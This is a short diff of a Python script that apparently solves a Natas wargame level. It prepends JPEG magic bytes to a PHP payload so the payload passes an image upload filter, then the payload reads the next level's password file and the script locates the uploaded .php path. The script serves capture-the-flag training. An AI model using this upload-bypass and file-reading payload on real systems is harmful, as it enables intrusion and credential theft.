@@ -54,6 +54,7 @@ php_script = """
 cat /etc/natas_webpass/natas14
 ?>
 """
+# reference: https://stackoverflow.com/questions/5649407/hexadecimal-string-to-byte-array-in-python
 jpg_magic_bytes = "ffd8ffdb"
 
 
@@ -69,3 +70,4 @@ div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {
 print(f'{div_content}\n')
 
 
+path = re.search(r'<a href="(upload/(\w+)\.php)">', str(div_content))[1]
